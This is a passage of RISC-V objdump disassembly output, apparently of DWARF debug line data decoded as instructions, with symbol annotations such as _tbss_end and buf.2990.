     bee:	0308                	addi	a0,sp,384
     bf0:	0900                	addi	s0,sp,144
     bf2:	000c                	0xc
     bf4:	0501                	addi	a0,a0,0
     bf6:	001f 0402 0301      	0x3010402001f
     bfc:	0900                	addi	s0,sp,144
     bfe:	0002                	c.slli	zero,0x0
     c00:	0501                	addi	a0,a0,0
     c02:	0021                	c.nop	8
     c04:	0402                	slli	s0,s0,0x0
     c06:	0301                	addi	t1,t1,0
     c08:	0900                	addi	s0,sp,144
     c0a:	0008                	0x8
     c0c:	0501                	addi	a0,a0,0
     c0e:	0402001b          	addiw	zero,tp,64
     c12:	0302                	slli	t1,t1,0x0
     c14:	000a097b          	0xa097b
     c18:	0501                	addi	a0,a0,0
     c1a:	0014                	0x14
     c1c:	0402                	slli	s0,s0,0x0
     c1e:	0301                	addi	t1,t1,0
     c20:	0900                	addi	s0,sp,144
     c22:	000a                	c.slli	zero,0x2
     c24:	0501                	addi	a0,a0,0
     c26:	0016                	c.slli	zero,0x5
     c28:	0402                	slli	s0,s0,0x0
     c2a:	0301                	addi	t1,t1,0
     c2c:	0900                	addi	s0,sp,144
     c2e:	0010                	0x10
     c30:	0501                	addi	a0,a0,0
     c32:	04020003          	lb	zero,64(tp) # 40 <buf.2990>
     c36:	0301                	addi	t1,t1,0
     c38:	0900                	addi	s0,sp,144
     c3a:	0008                	0x8
     c3c:	0501                	addi	a0,a0,0
     c3e:	030d                	addi	t1,t1,3
     c40:	000a0907          	0xa0907
     c44:	0501                	addi	a0,a0,0
     c46:	0306                	slli	t1,t1,0x1
     c48:	0900                	addi	s0,sp,144
     c4a:	0008                	0x8
     c4c:	0501                	addi	a0,a0,0
     c4e:	0019                	c.nop	6
     c50:	0402                	slli	s0,s0,0x0
     c52:	0301                	addi	t1,t1,0
     c54:	0900                	addi	s0,sp,144
     c56:	0002                	c.slli	zero,0x0
     c58:	0501                	addi	a0,a0,0
     c5a:	0028                	addi	a0,sp,8
     c5c:	0402                	slli	s0,s0,0x0
     c5e:	0301                	addi	t1,t1,0
     c60:	0900                	addi	s0,sp,144
     c62:	0010                	0x10
     c64:	0501                	addi	a0,a0,0
     c66:	0012                	c.slli	zero,0x4
     c68:	0402                	slli	s0,s0,0x0
     c6a:	0301                	addi	t1,t1,0
     c6c:	0900                	addi	s0,sp,144
     c6e:	0010                	0x10
     c70:	0501                	addi	a0,a0,0
     c72:	030c                	addi	a1,sp,384
     c74:	0901                	addi	s2,s2,0
     c76:	0006                	c.slli	zero,0x1
     c78:	0501                	addi	a0,a0,0
     c7a:	030a                	slli	t1,t1,0x2
     c7c:	0901                	addi	s2,s2,0
     c7e:	0006                	c.slli	zero,0x1
     c80:	0501                	addi	a0,a0,0
     c82:	0301                	addi	t1,t1,0
     c84:	0901                	addi	s2,s2,0
     c86:	0002                	c.slli	zero,0x0
     c88:	0301                	addi	t1,t1,0
     c8a:	00080903          	lb	s2,0(a6)
     c8e:	0501                	addi	a0,a0,0
     c90:	09050303          	lb	t1,144(a0) # 19090 <_tbss_end+0x1900c>
     c94:	000c                	0xc
     c96:	0501                	addi	a0,a0,0
     c98:	0311                	addi	t1,t1,4
     c9a:	0902                	slli	s2,s2,0x0
     c9c:	0004                	0x4
     c9e:	0501                	addi	a0,a0,0
     ca0:	0900030f          	0x900030f
     ca4:	0010                	0x10
     ca6:	0501                	addi	a0,a0,0
     ca8:	09010307          	0x9010307
     cac:	0004                	0x4
     cae:	0501                	addi	a0,a0,0
     cb0:	0330                	addi	a2,sp,392
     cb2:	0900                	addi	s0,sp,144
     cb4:	001a                	c.slli	zero,0x6
     cb6:	0501                	addi	a0,a0,0
     cb8:	0306                	slli	t1,t1,0x1
     cba:	0900                	addi	s0,sp,144
     cbc:	0008                	0x8
     cbe:	0501                	addi	a0,a0,0
     cc0:	0902030b          	0x902030b
     cc4:	0004                	0x4
     cc6:	0301                	addi	t1,t1,0
     cc8:	0901                	addi	s2,s2,0
     cca:	000c                	0xc
     ccc:	0501                	addi	a0,a0,0
     cce:	030d                	addi	t1,t1,3
     cd0:	0902                	slli	s2,s2,0x0
     cd2:	0010                	0x10
     cd4:	0501                	addi	a0,a0,0
     cd6:	0014                	0x14
     cd8:	0402                	slli	s0,s0,0x0
     cda:	0301                	addi	t1,t1,0
     cdc:	0900                	addi	s0,sp,144
     cde:	0002                	c.slli	zero,0x0
     ce0:	0501                	addi	a0,a0,0
     ce2:	000d                	c.nop	3
     ce4:	0402                	slli	s0,s0,0x0
     ce6:	0301                	addi	t1,t1,0
     ce8:	0900                	addi	s0,sp,144
     cea:	0012                	c.slli	zero,0x4
     cec:	0501                	addi	a0,a0,0
     cee:	09030303          	lb	t1,144(t1) # 9010c36 <_tbss_end+0x9010bb2>
     cf2:	0004                	0x4
     cf4:	0501                	addi	a0,a0,0
     cf6:	0301                	addi	t1,t1,0
     cf8:	0901                	addi	s2,s2,0
     cfa:	0004                	0x4
     cfc:	0301                	addi	t1,t1,0
     cfe:	00080903          	lb	s2,0(a6)
     d02:	0501                	addi	a0,a0,0
     d04:	031a                	slli	t1,t1,0x6
     d06:	0901                	addi	s2,s2,0
     d08:	000a                	c.slli	zero,0x2
     d0a:	0501                	addi	a0,a0,0
     d0c:	0315                	addi	t1,t1,5
     d0e:	0900                	addi	s0,sp,144
     d10:	0008                	0x8
     d12:	0501                	addi	a0,a0,0
     d14:	030c                	addi	a1,sp,384
     d16:	0900                	addi	s0,sp,144
     d18:	0006                	c.slli	zero,0x1
     d1a:	0501                	addi	a0,a0,0
     d1c:	030d                	addi	t1,t1,3
     d1e:	0901                	addi	s2,s2,0
     d20:	0006                	c.slli	zero,0x1
     d22:	0501                	addi	a0,a0,0
     d24:	031a                	slli	t1,t1,0x6
     d26:	0900                	addi	s0,sp,144
     d28:	0008                	0x8
     d2a:	0501                	addi	a0,a0,0
     d2c:	09000313          	li	t1,144
     d30:	0006                	c.slli	zero,0x1
     d32:	0501                	addi	a0,a0,0
     d34:	0301                	addi	t1,t1,0
     d36:	0901                	addi	s2,s2,0
     d38:	0002                	c.slli	zero,0x0
     d3a:	0401                	addi	s0,s0,0
     d3c:	0302                	slli	t1,t1,0x0
     d3e:	7f9d                	lui	t6,0xfffe7
     d40:	0809                	addi	a6,a6,2
     d42:	0100                	addi	s0,sp,128
     d44:	1005                	c.nop	-31
     d46:	2e090203          	lb	tp,736(s2)
     d4a:	0100                	addi	s0,sp,128
     d4c:	06090103          	lb	sp,96(s2)
     d50:	0100                	addi	s0,sp,128
     d52:	06090103          	lb	sp,96(s2)
     d56:	0100                	addi	s0,sp,128
     d58:	06090103          	lb	sp,96(s2)
     d5c:	0100                	addi	s0,sp,128
     d5e:	0305                	addi	t1,t1,1
     d60:	06090103          	lb	sp,96(s2)
     d64:	0100                	addi	s0,sp,128
     d66:	0c05                	addi	s8,s8,1
     d68:	04090203          	lb	tp,64(s2)
     d6c:	0100                	addi	s0,sp,128
     d6e:	0a05                	addi	s4,s4,1
     d70:	02090003          	lb	zero,32(s2)
     d74:	0100                	addi	s0,sp,128
     d76:	0905                	addi	s2,s2,1
     d78:	0a090103          	lb	sp,160(s2)
     d7c:	0100                	addi	s0,sp,128
     d7e:	1305                	addi	t1,t1,-31
     d80:	0200                	addi	s0,sp,256
     d82:	0104                	addi	s1,sp,128
     d84:	02090003          	lb	zero,32(s2)
     d88:	0100                	addi	s0,sp,128
     d8a:	0905                	addi	s2,s2,1
     d8c:	0200                	addi	s0,sp,256
     d8e:	0104                	addi	s1,sp,128
     d90:	0a090003          	lb	zero,160(s2)
     d94:	0100                	addi	s0,sp,128
     d96:	0c05                	addi	s8,s8,1
     d98:	02090203          	lb	tp,32(s2)
     d9c:	0100                	addi	s0,sp,128
     d9e:	0305                	addi	t1,t1,1
     da0:	0c090203          	lb	tp,192(s2)
     da4:	0100                	addi	s0,sp,128
     da6:	1305                	addi	t1,t1,-31
     da8:	04090103          	lb	sp,64(s2)
     dac:	0100                	addi	s0,sp,128
     dae:	0105                	addi	sp,sp,1
     db0:	02090103          	lb	sp,32(s2)
     db4:	0100                	addi	s0,sp,128
     db6:	08090703          	lb	a4,128(s2)
     dba:	0100                	addi	s0,sp,128
     dbc:	0705                	addi	a4,a4,1
     dbe:	0c090103          	lb	sp,192(s2)
     dc2:	0100                	addi	s0,sp,128
     dc4:	0305                	addi	t1,t1,1
     dc6:	0200                	addi	s0,sp,256
     dc8:	0104                	addi	s1,sp,128
     dca:	04090803          	lb	a6,64(s2)
     dce:	0100                	addi	s0,sp,128
     dd0:	0200                	addi	s0,sp,256
     dd2:	0204                	addi	s1,sp,256
     dd4:	0306                	slli	t1,t1,0x1
     dd6:	0900                	addi	s0,sp,144
     dd8:	000e                	c.slli	zero,0x3
     dda:	0001                	nop
     ddc:	0402                	slli	s0,s0,0x0
     dde:	09000303          	lb	t1,144(zero) # 90 <_tbss_end+0xc>
     de2:	0018                	0x18
     de4:	0001                	nop
     de6:	0402                	slli	s0,s0,0x0
     de8:	0305                	addi	t1,t1,1
     dea:	0900                	addi	s0,sp,144
     dec:	0038                	addi	a4,sp,8
     dee:	0001                	nop
     df0:	0402                	slli	s0,s0,0x0
     df2:	0601                	addi	a2,a2,0
     df4:	1e090103          	lb	sp,480(s2)
     df8:	0100                	addi	s0,sp,128
     dfa:	0200                	addi	s0,sp,256
     dfc:	0204                	addi	s1,sp,256
     dfe:	0306                	slli	t1,t1,0x1
     e00:	0900                	addi	s0,sp,144
     e02:	000e                	c.slli	zero,0x3
     e04:	0001                	nop
     e06:	0402                	slli	s0,s0,0x0
     e08:	09000303          	lb	t1,144(zero) # 90 <_tbss_end+0xc>
     e0c:	0018                	0x18
     e0e:	0001                	nop
     e10:	0402                	slli	s0,s0,0x0
     e12:	0305                	addi	t1,t1,1
     e14:	0900                	addi	s0,sp,144
     e16:	0038                	addi	a4,sp,8
     e18:	0501                	addi	a0,a0,0
     e1a:	0001                	nop
     e1c:	0402                	slli	s0,s0,0x0
     e1e:	0605                	addi	a2,a2,1
     e20:	1e090303          	lb	t1,480(s2)
     e24:	0100                	addi	s0,sp,128
     e26:	08090303          	lb	t1,128(s2)
     e2a:	0100                	addi	s0,sp,128
     e2c:	1205                	addi	tp,tp,-31
     e2e:	0a090103          	lb	sp,160(s2)
     e32:	0100                	addi	s0,sp,128
     e34:	1805                	addi	a6,a6,-31
     e36:	06090003          	lb	zero,96(s2)
     e3a:	0100                	addi	s0,sp,128
     e3c:	0a05                	addi	s4,s4,1
     e3e:	04090003          	lb	zero,64(s2)
     e42:	0100                	addi	s0,sp,128
     e44:	0905                	addi	s2,s2,1
     e46:	0200                	addi	s0,sp,256
     e48:	0104                	addi	s1,sp,128
     e4a:	0a090103          	lb	sp,160(s2)
     e4e:	0100                	addi	s0,sp,128
     e50:	0105                	addi	sp,sp,1
     e52:	02090403          	lb	s0,32(s2)
     e56:	0100                	addi	s0,sp,128
     e58:	0305                	addi	t1,t1,1
     e5a:	14090103          	lb	sp,320(s2)
     e5e:	0100                	addi	s0,sp,128
     e60:	0105                	addi	sp,sp,1
     e62:	08090403          	lb	s0,128(s2)
     e66:	0100                	addi	s0,sp,128
     e68:	0305                	addi	t1,t1,1
     e6a:	0e090103          	lb	sp,224(s2)
     e6e:	0100                	addi	s0,sp,128
     e70:	0105                	addi	sp,sp,1
     e72:	0a090403          	lb	s0,160(s2)
     e76:	0100                	addi	s0,sp,128
     e78:	0305                	addi	t1,t1,1
     e7a:	08090103          	lb	sp,128(s2)
     e7e:	0100                	addi	s0,sp,128
     e80:	0105                	addi	sp,sp,1
     e82:	08090403          	lb	s0,128(s2)
     e86:	0100                	addi	s0,sp,128
     e88:	0305                	addi	t1,t1,1
     e8a:	0e090103          	lb	sp,224(s2)
     e8e:	0100                	addi	s0,sp,128
     e90:	0105                	addi	sp,sp,1
     e92:	1c090103          	lb	sp,448(s2)
     e96:	0100                	addi	s0,sp,128
     e98:	0c090303          	lb	t1,192(s2)
     e9c:	0100                	addi	s0,sp,128
     e9e:	0905                	addi	s2,s2,1
     ea0:	0200                	addi	s0,sp,256
     ea2:	0104                	addi	s1,sp,128
     ea4:	14090303          	lb	t1,320(s2)
     ea8:	0100                	addi	s0,sp,128
     eaa:	0105                	addi	sp,sp,1
     eac:	08090103          	lb	sp,128(s2)
     eb0:	0100                	addi	s0,sp,128
     eb2:	0a090303          	lb	t1,160(s2)
     eb6:	0100                	addi	s0,sp,128
     eb8:	0305                	addi	t1,t1,1
     eba:	12090203          	lb	tp,288(s2)
     ebe:	0100                	addi	s0,sp,128
     ec0:	0a05                	addi	s4,s4,1
     ec2:	0c090103          	lb	sp,192(s2)
     ec6:	0100                	addi	s0,sp,128
     ec8:	0105                	addi	sp,sp,1
     eca:	02090103          	lb	sp,32(s2)
     ece:	0100                	addi	s0,sp,128
     ed0:	0a090303          	lb	t1,160(s2)
     ed4:	0100                	addi	s0,sp,128
     ed6:	2305                	addiw	t1,t1,1
     ed8:	08090403          	lb	s0,128(s2)
     edc:	0100                	addi	s0,sp,128
     ede:	0a05                	addi	s4,s4,1
     ee0:	0c090003          	lb	zero,192(s2)
     ee4:	0100                	addi	s0,sp,128
     ee6:	0305                	addi	t1,t1,1
     ee8:	04090103          	lb	sp,64(s2)
     eec:	0100                	addi	s0,sp,128
     eee:	2105                	addiw	sp,sp,1
     ef0:	14090103          	lb	sp,320(s2)
     ef4:	0100                	addi	s0,sp,128
     ef6:	0a05                	addi	s4,s4,1
     ef8:	0c090003          	lb	zero,192(s2)
     efc:	0100                	addi	s0,sp,128
     efe:	0305                	addi	t1,t1,1
     f00:	04090103          	lb	sp,64(s2)
     f04:	0100                	addi	s0,sp,128
     f06:	0105                	addi	sp,sp,1
     f08:	14090103          	lb	sp,320(s2)
     f0c:	0100                	addi	s0,sp,128
     f0e:	0a090303          	lb	t1,160(s2)
     f12:	0100                	addi	s0,sp,128
     f14:	0305                	addi	t1,t1,1
     f16:	32090103          	lb	sp,800(s2)
     f1a:	0100                	addi	s0,sp,128
     f1c:	04090103          	lb	sp,64(s2)
     f20:	0100                	addi	s0,sp,128
     f22:	0d05                	addi	s10,s10,1
     f24:	10090303          	lb	t1,256(s2)
     f28:	0100                	addi	s0,sp,128
     f2a:	0905                	addi	s2,s2,1
     f2c:	0e090303          	lb	t1,224(s2)
     f30:	0100                	addi	s0,sp,128
     f32:	0c05                	addi	s8,s8,1
     f34:	04090103          	lb	sp,64(s2)
     f38:	0100                	addi	s0,sp,128
     f3a:	0305                	addi	t1,t1,1
     f3c:	04090003          	lb	zero,64(s2)
     f40:	0100                	addi	s0,sp,128
     f42:	1105                	addi	sp,sp,-31
     f44:	02090103          	lb	sp,32(s2)
     f48:	0100                	addi	s0,sp,128
     f4a:	0805                	addi	a6,a6,1
     f4c:	12090003          	lb	zero,288(s2)
     f50:	0100                	addi	s0,sp,128
     f52:	0f05                	addi	t5,t5,1
     f54:	02090103          	lb	sp,32(s2)
     f58:	0100                	addi	s0,sp,128
     f5a:	0c05                	addi	s8,s8,1
     f5c:	3a090003          	lb	zero,928(s2)
     f60:	0100                	addi	s0,sp,128
     f62:	2605                	addiw	a2,a2,1
     f64:	0200                	addi	s0,sp,256
     f66:	0204                	addi	s1,sp,256
     f68:	0a097e03          	0xa097e03
     f6c:	0100                	addi	s0,sp,128
     f6e:	0305                	addi	t1,t1,1
     f70:	0200                	addi	s0,sp,256
     f72:	0104                	addi	s1,sp,128
     f74:	0a090003          	lb	zero,160(s2)
     f78:	0100                	addi	s0,sp,128
     f7a:	0605                	addi	a2,a2,1
     f7c:	0e090303          	lb	t1,224(s2)
     f80:	0100                	addi	s0,sp,128
     f82:	0505                	addi	a0,a0,1
     f84:	08090103          	lb	sp,128(s2)
     f88:	0100                	addi	s0,sp,128
     f8a:	0305                	addi	t1,t1,1
     f8c:	06090203          	lb	tp,96(s2)
     f90:	0100                	addi	s0,sp,128
     f92:	0105                	addi	sp,sp,1
     f94:	0a090503          	lb	a0,160(s2)
     f98:	0100                	addi	s0,sp,128
     f9a:	0d05                	addi	s10,s10,1
     f9c:	0e090403          	lb	s0,224(s2)
     fa0:	0100                	addi	s0,sp,128
     fa2:	1105                	addi	sp,sp,-31
     fa4:	10090003          	lb	zero,256(s2)
     fa8:	0100                	addi	s0,sp,128
     faa:	0605                	addi	a2,a2,1
     fac:	12090203          	lb	tp,288(s2)
     fb0:	0100                	addi	s0,sp,128
     fb2:	1c05                	addi	s8,s8,-31
     fb4:	0200                	addi	s0,sp,256
     fb6:	0104                	addi	s1,sp,128
     fb8:	0e090003          	lb	zero,224(s2)
     fbc:	0100                	addi	s0,sp,128
     fbe:	1205                	addi	tp,tp,-31
     fc0:	0200                	addi	s0,sp,256
     fc2:	0104                	addi	s1,sp,128
     fc4:	04090003          	lb	zero,64(s2)
     fc8:	0100                	addi	s0,sp,128
     fca:	0505                	addi	a0,a0,1
     fcc:	0a090203          	lb	tp,160(s2)
     fd0:	0100                	addi	s0,sp,128
     fd2:	0c05                	addi	s8,s8,1
     fd4:	16090103          	lb	sp,352(s2)
     fd8:	0100                	addi	s0,sp,128
     fda:	0a05                	addi	s4,s4,1
     fdc:	04090303          	lb	t1,64(s2)
     fe0:	0100                	addi	s0,sp,128
     fe2:	0105                	addi	sp,sp,1
     fe4:	02090103          	lb	sp,32(s2)
     fe8:	0100                	addi	s0,sp,128
     fea:	0a090303          	lb	t1,160(s2)
     fee:	0100                	addi	s0,sp,128
     ff0:	0a05                	addi	s4,s4,1
     ff2:	0c090303          	lb	t1,192(s2)
     ff6:	0100                	addi	s0,sp,128
     ff8:	0305                	addi	t1,t1,1
     ffa:	04090003          	lb	zero,64(s2)
     ffe:	0100                	addi	s0,sp,128
    1000:	1405                	addi	s0,s0,-31
    1002:	02090203          	lb	tp,32(s2)
    1006:	0100                	addi	s0,sp,128
    1008:	2105                	addiw	sp,sp,1
    100a:	0e090003          	lb	zero,224(s2)
    100e:	0100                	addi	s0,sp,128
    1010:	1b05                	addi	s6,s6,-31
    1012:	08090003          	lb	zero,128(s2)
    1016:	0100                	addi	s0,sp,128
    1018:	0200                	addi	s0,sp,256
    101a:	0104                	addi	s1,sp,128
    101c:	0306                	slli	t1,t1,0x1
    101e:	0900                	addi	s0,sp,144
    1020:	0006                	c.slli	zero,0x1
    1022:	0001                	nop
    1024:	0402                	slli	s0,s0,0x0
    1026:	0302                	slli	t1,t1,0x0
    1028:	0900                	addi	s0,sp,144
    102a:	0006                	c.slli	zero,0x1
    102c:	0501                	addi	a0,a0,0
    102e:	0402000b          	0x402000b
    1032:	0604                	addi	s1,sp,768
    1034:	04090003          	lb	zero,64(s2)
    1038:	0100                	addi	s0,sp,128
    103a:	1b05                	addi	s6,s6,-31
    103c:	0200                	addi	s0,sp,256
    103e:	0404                	addi	s1,sp,512
    1040:	0c090003          	lb	zero,192(s2)
    1044:	0100                	addi	s0,sp,128
    1046:	0f05                	addi	t5,t5,1
    1048:	0200                	addi	s0,sp,256
    104a:	0404                	addi	s1,sp,512
    104c:	06090003          	lb	zero,96(s2)
    1050:	0100                	addi	s0,sp,128
    1052:	0705                	addi	a4,a4,1
    1054:	0200                	addi	s0,sp,256
    1056:	0404                	addi	s1,sp,512
    1058:	0a090103          	lb	sp,160(s2)
    105c:	0100                	addi	s0,sp,128
    105e:	1805                	addi	a6,a6,-31
    1060:	0200                	addi	s0,sp,256
    1062:	0404                	addi	s1,sp,512
    1064:	0a097d03          	0xa097d03
    1068:	0100                	addi	s0,sp,128
    106a:	0305                	addi	t1,t1,1
    106c:	0200                	addi	s0,sp,256
    106e:	0204                	addi	s1,sp,256
    1070:	0a090003          	lb	zero,160(s2)
    1074:	0100                	addi	s0,sp,128
    1076:	0b05                	addi	s6,s6,1
    1078:	0e090503          	lb	a0,224(s2)
    107c:	0100                	addi	s0,sp,128
    107e:	0305                	addi	t1,t1,1
    1080:	04090203          	lb	tp,64(s2)
    1084:	0100                	addi	s0,sp,128
    1086:	0105                	addi	sp,sp,1
    1088:	0a090103          	lb	sp,160(s2)
    108c:	0100                	addi	s0,sp,128
    108e:	0a090403          	lb	s0,160(s2)
    1092:	0100                	addi	s0,sp,128
    1094:	0705                	addi	a4,a4,1
    1096:	2c090203          	lb	tp,704(s2)
    109a:	0100                	addi	s0,sp,128
    109c:	1705                	addi	a4,a4,-31
    109e:	04090403          	lb	s0,64(s2)
    10a2:	0100                	addi	s0,sp,128
    10a4:	0d05                	addi	s10,s10,1
    10a6:	0c090003          	lb	zero,192(s2)
    10aa:	0100                	addi	s0,sp,128
    10ac:	1105                	addi	sp,sp,-31
    10ae:	0c090003          	lb	zero,192(s2)
    10b2:	0100                	addi	s0,sp,128
    10b4:	0d05                	addi	s10,s10,1
    10b6:	10090103          	lb	sp,256(s2)
    10ba:	0100                	addi	s0,sp,128
    10bc:	0805                	addi	a6,a6,1
    10be:	04090003          	lb	zero,64(s2)
    10c2:	0100                	addi	s0,sp,128
    10c4:	0905                	addi	s2,s2,1
    10c6:	08090203          	lb	tp,128(s2)
    10ca:	0100                	addi	s0,sp,128
    10cc:	1105                	addi	sp,sp,-31
    10ce:	10097d03          	0x10097d03
    10d2:	0100                	addi	s0,sp,128
    10d4:	0705                	addi	a4,a4,1
    10d6:	02090203          	lb	tp,32(s2)
    10da:	0100                	addi	s0,sp,128
    10dc:	0905                	addi	s2,s2,1
    10de:	02090403          	lb	s0,32(s2)
    10e2:	0100                	addi	s0,sp,128
    10e4:	0505                	addi	a0,a0,1
    10e6:	02090103          	lb	sp,32(s2)
    10ea:	0100                	addi	s0,sp,128
    10ec:	0f05                	addi	t5,t5,1
    10ee:	10097f03          	0x10097f03
    10f2:	0100                	addi	s0,sp,128
    10f4:	0905                	addi	s2,s2,1
    10f6:	0c090003          	lb	zero,192(s2)
    10fa:	0100                	addi	s0,sp,128
    10fc:	0a090303          	lb	t1,160(s2)
    1100:	0100                	addi	s0,sp,128
    1102:	0f05                	addi	t5,t5,1
    1104:	02090103          	lb	sp,32(s2)
    1108:	0100                	addi	s0,sp,128
    110a:	1c05                	addi	s8,s8,-31
    110c:	10090003          	lb	zero,256(s2)
    1110:	0100                	addi	s0,sp,128
    1112:	3305                	addiw	t1,t1,-31
    1114:	10090003          	lb	zero,256(s2)
    1118:	0100                	addi	s0,sp,128
    111a:	0200                	addi	s0,sp,256
    111c:	0104                	addi	s1,sp,128
    111e:	0306                	slli	t1,t1,0x1
    1120:	0900                	addi	s0,sp,144
    1122:	0008                	0x8
    1124:	0001                	nop
    1126:	0402                	slli	s0,s0,0x0
    1128:	0302                	slli	t1,t1,0x0
    112a:	0900                	addi	s0,sp,144
    112c:	0006                	c.slli	zero,0x1
    112e:	0501                	addi	a0,a0,0
    1130:	0015                	c.nop	5
    1132:	0402                	slli	s0,s0,0x0
    1134:	0604                	addi	s1,sp,768
    1136:	04090003          	lb	zero,64(s2)
    113a:	0100                	addi	s0,sp,128
    113c:	0505                	addi	a0,a0,1
    113e:	0200                	addi	s0,sp,256
    1140:	0404                	addi	s1,sp,512
    1142:	04090003          	lb	zero,64(s2)
    1146:	0100                	addi	s0,sp,128
    1148:	0d05                	addi	s10,s10,1
    114a:	0e097f03          	0xe097f03
    114e:	0100                	addi	s0,sp,128
    1150:	0905                	addi	s2,s2,1
    1152:	0c090003          	lb	zero,192(s2)
    1156:	0100                	addi	s0,sp,128
    1158:	0105                	addi	sp,sp,1
    115a:	04090203          	lb	tp,64(s2)
    115e:	0100                	addi	s0,sp,128
    1160:	0c090303          	lb	t1,192(s2)
    1164:	0100                	addi	s0,sp,128
    1166:	0605                	addi	a2,a2,1
    1168:	10090103          	lb	sp,256(s2)
    116c:	0100                	addi	s0,sp,128
    116e:	0c05                	addi	s8,s8,1
    1170:	0e090103          	lb	sp,224(s2)
    1174:	0100                	addi	s0,sp,128
    1176:	0b05                	addi	s6,s6,1
    1178:	14090103          	lb	sp,320(s2)
    117c:	0100                	addi	s0,sp,128
    117e:	0c05                	addi	s8,s8,1
    1180:	08090103          	lb	sp,128(s2)
    1184:	0100                	addi	s0,sp,128
    1186:	14090203          	lb	tp,320(s2)
    118a:	0100                	addi	s0,sp,128
    118c:	0105                	addi	sp,sp,1
    118e:	16090103          	lb	sp,352(s2)
    1192:	0100                	addi	s0,sp,128
    1194:	08090303          	lb	t1,128(s2)
    1198:	0100                	addi	s0,sp,128
    119a:	0605                	addi	a2,a2,1
    119c:	10090103          	lb	sp,256(s2)
    11a0:	0100                	addi	s0,sp,128
    11a2:	0c05                	addi	s8,s8,1
    11a4:	0e090103          	lb	sp,224(s2)
    11a8:	0100                	addi	s0,sp,128
    11aa:	0b05                	addi	s6,s6,1
    11ac:	14090103          	lb	sp,320(s2)
    11b0:	0100                	addi	s0,sp,128
    11b2:	0c05                	addi	s8,s8,1
    11b4:	08090103          	lb	sp,128(s2)
    11b8:	0100                	addi	s0,sp,128
    11ba:	14090203          	lb	tp,320(s2)
    11be:	0100                	addi	s0,sp,128
    11c0:	0105                	addi	sp,sp,1
    11c2:	12090103          	lb	sp,288(s2)
    11c6:	0100                	addi	s0,sp,128
    11c8:	08090303          	lb	t1,128(s2)
    11cc:	0100                	addi	s0,sp,128
    11ce:	0b05                	addi	s6,s6,1
    11d0:	1c090903          	lb	s2,448(s2)
    11d4:	0100                	addi	s0,sp,128
    11d6:	0a05                	addi	s4,s4,1
    11d8:	02090103          	lb	sp,32(s2)
    11dc:	0100                	addi	s0,sp,128
    11de:	04090203          	lb	tp,64(s2)
    11e2:	0100                	addi	s0,sp,128
    11e4:	0705                	addi	a4,a4,1
    11e6:	0a090103          	lb	sp,160(s2)
    11ea:	0100                	addi	s0,sp,128
    11ec:	1205                	addi	tp,tp,-31
    11ee:	0c097c03          	0xc097c03
    11f2:	0100                	addi	s0,sp,128
    11f4:	1005                	c.nop	-31
    11f6:	08090003          	lb	zero,128(s2)
    11fa:	0100                	addi	s0,sp,128
    11fc:	0b05                	addi	s6,s6,1
    11fe:	04090003          	lb	zero,64(s2)
    1202:	0100                	addi	s0,sp,128
    1204:	0805                	addi	a6,a6,1
    1206:	0a090603          	lb	a2,160(s2)
    120a:	0100                	addi	s0,sp,128
    120c:	0e05                	addi	t3,t3,1
    120e:	0a090303          	lb	t1,160(s2)
    1212:	0100                	addi	s0,sp,128
    1214:	0a05                	addi	s4,s4,1
    1216:	08090103          	lb	sp,128(s2)
    121a:	0100                	addi	s0,sp,128
    121c:	0b05                	addi	s6,s6,1
    121e:	08090103          	lb	sp,128(s2)
    1222:	0100                	addi	s0,sp,128
    1224:	0f05                	addi	t5,t5,1
    1226:	06090103          	lb	sp,96(s2)
    122a:	0100                	addi	s0,sp,128
    122c:	0b05                	addi	s6,s6,1
    122e:	06090103          	lb	sp,96(s2)
    1232:	0100                	addi	s0,sp,128
    1234:	0d05                	addi	s10,s10,1
    1236:	04090103          	lb	sp,64(s2)
    123a:	0100                	addi	s0,sp,128
    123c:	1305                	addi	t1,t1,-31
    123e:	04090203          	lb	tp,64(s2)
    1242:	0100                	addi	s0,sp,128
    1244:	1205                	addi	tp,tp,-31
    1246:	0c090003          	lb	zero,192(s2)
    124a:	0100                	addi	s0,sp,128
    124c:	1005                	c.nop	-31
    124e:	04090003          	lb	zero,64(s2)
    1252:	0100                	addi	s0,sp,128
    1254:	0c05                	addi	s8,s8,1
    1256:	3a090403          	lb	s0,928(s2)
    125a:	0100                	addi	s0,sp,128
    125c:	0705                	addi	a4,a4,1
    125e:	08090103          	lb	sp,128(s2)
    1262:	0100                	addi	s0,sp,128
    1264:	0c05                	addi	s8,s8,1
    1266:	02090403          	lb	s0,32(s2)
    126a:	0100                	addi	s0,sp,128
    126c:	0705                	addi	a4,a4,1
    126e:	08090103          	lb	sp,128(s2)
    1272:	0100                	addi	s0,sp,128
    1274:	1605                	addi	a2,a2,-31
    1276:	02090c03          	lb	s8,32(s2)
    127a:	0100                	addi	s0,sp,128
    127c:	1f05                	addi	t5,t5,-31
    127e:	04090103          	lb	sp,64(s2)
    1282:	0100                	addi	s0,sp,128
    1284:	2405                	addiw	s0,s0,1
    1286:	12090003          	lb	zero,288(s2)
    128a:	0100                	addi	s0,sp,128
    128c:	1305                	addi	t1,t1,-31
    128e:	04090003          	lb	zero,64(s2)
    1292:	0100                	addi	s0,sp,128
    1294:	0e05                	addi	t3,t3,1
    1296:	08090103          	lb	sp,128(s2)
    129a:	0100                	addi	s0,sp,128
    129c:	0c05                	addi	s8,s8,1
    129e:	08090003          	lb	zero,128(s2)
    12a2:	0100                	addi	s0,sp,128
    12a4:	04090103          	lb	sp,64(s2)
    12a8:	0100                	addi	s0,sp,128
    12aa:	1605                	addi	a2,a2,-31
    12ac:	0200                	addi	s0,sp,256
    12ae:	0104                	addi	s1,sp,128
    12b0:	0a090003          	lb	zero,160(s2)
    12b4:	0100                	addi	s0,sp,128
    12b6:	1d05                	addi	s10,s10,-31
    12b8:	0a097d03          	0xa097d03
    12bc:	0100                	addi	s0,sp,128
    12be:	1305                	addi	t1,t1,-31
    12c0:	0a090103          	lb	sp,160(s2)
    12c4:	0100                	addi	s0,sp,128
    12c6:	1105                	addi	sp,sp,-31
    12c8:	02090803          	lb	a6,32(s2)
    12cc:	0100                	addi	s0,sp,128
    12ce:	0705                	addi	a4,a4,1
    12d0:	12090103          	lb	sp,288(s2)
    12d4:	0100                	addi	s0,sp,128
    12d6:	0a05                	addi	s4,s4,1
    12d8:	02090303          	lb	t1,32(s2)
    12dc:	0100                	addi	s0,sp,128
    12de:	0f05                	addi	t5,t5,1
    12e0:	0a090103          	lb	sp,160(s2)
    12e4:	0100                	addi	s0,sp,128
    12e6:	0705                	addi	a4,a4,1
    12e8:	04090103          	lb	sp,64(s2)
    12ec:	0100                	addi	s0,sp,128
    12ee:	0f05                	addi	t5,t5,1
